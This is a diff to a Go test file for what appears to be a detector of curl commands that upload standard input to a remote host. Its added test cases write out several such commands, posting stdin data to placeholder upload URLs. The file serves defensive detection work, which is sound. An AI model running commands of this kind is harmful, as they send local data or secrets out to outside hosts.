@@ -169,8 +169,23 @@ func TestStaticCurlStdinUploadTargets(t *testing.T) {
 				"https://sink.example/upload",
 		},
 		{
-			name:    "another request option exceeds exact sink grammar",
-			command: "curl -X POST --data-binary @- https://sink.example/upload",
+			name:     "explicit post keeps stdin upload target",
+			command:  "curl -X POST --data-binary @- https://example.invalid/upload",
+			wantHost: "example.invalid",
+		},
+		{
+			name:     "common option order keeps stdin upload target",
+			command:  "curl -s -X POST -H 'X-Marker: fixture' --data-binary @- https://example.invalid/upload",
+			wantHost: "example.invalid",
+		},
+		{
+			name:     "combined quiet options keep stdin upload target",
+			command:  "curl -sS --data-binary @- https://example.invalid/upload",
+			wantHost: "example.invalid",
+		},
+		{
+			name:    "header stdin competes with body",
+			command: "curl -H @- --data-binary @- https://example.invalid/upload",
 		},
 		{
 			name:    "configuration is opaque",
